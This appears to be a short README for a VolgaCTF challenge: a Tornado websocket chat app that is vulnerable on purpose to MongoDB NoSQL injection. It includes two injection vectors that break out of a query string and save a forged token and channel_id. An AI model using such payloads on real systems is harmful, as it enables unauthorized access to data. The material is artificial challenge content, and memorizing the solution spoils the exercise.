
web socket chat application on tornado engine.

with injection into NoSQL MongoDB vulnerability.
you need to recive message from bot from VolgaCTF_Flag_Channel.

use it for education purposes only.


application use:

	mongodb = 3.2.4
	
	python = 3.5



injection vectors

	#'}), db.connections.save({'token':'123'})}//
	#'}), db.connections.save({"token": "ca434f43e33ccf546a765742f60ec7ec", "channel_id": "56f442972b03a12728a9ff55"})}//